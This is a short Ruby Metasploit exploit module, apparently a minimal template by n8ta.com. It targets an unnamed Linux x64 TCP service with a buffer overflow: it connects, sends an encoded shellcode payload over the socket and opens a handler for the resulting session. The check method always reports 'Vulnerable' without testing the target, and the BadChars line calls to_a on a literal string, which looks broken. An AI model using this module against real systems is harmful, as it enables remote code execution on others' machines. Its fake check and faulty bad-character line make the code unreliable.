class MetasploitModule < Msf::Exploit::Remote
  include Exploit::Remote::Tcp
  def initialize(info = {})
    super(update_info( info,
                      'Name' => 'Buffer Overflow',
                      'Description' => %q(),
                      'Author' => 'n8ta.com',
                      'Payload' => {
                        'MinNops' => 8,
                        'Space' => 232,
                        'BadChars' => ["\x00.. \x0A"].to_a.join,
                      },
                      'Targets' => [
                        ['Linux', {'Linux' => {}}]],
                      'DefaultTarget'  => 0,
                      'Arch'           => ARCH_X64,
                      'Platform'       => 'linux',
    ))
  end

  def check
    Exploit::CheckCode::Vulnerable
  end

  def exploit()
    connect

    buf = payload.encoded
    print_status("Sending #{buf.length} bytes...")
    sock.put(buf)

    handler
  end

end